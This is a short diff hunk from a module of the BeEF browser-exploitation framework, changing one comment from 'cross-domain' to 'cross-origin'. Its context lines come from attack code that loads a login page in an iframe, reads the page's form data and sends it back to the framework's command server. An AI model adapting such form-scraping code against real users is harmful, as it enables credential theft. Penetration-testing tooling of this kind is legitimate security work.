@@ -59,7 +59,7 @@ beef.execute(function() {
 			}
 
 		} catch (e) {
-			// return if no forms were found or login page is cross-domain
+			// return if no forms were found or login page is cross-origin
 			beef.net.send('<%= @command_url %>', <%= @command_id %>, 'form_data=Could not read form data from '+login_url);
 		}
 		document.body.removeChild(iframe);
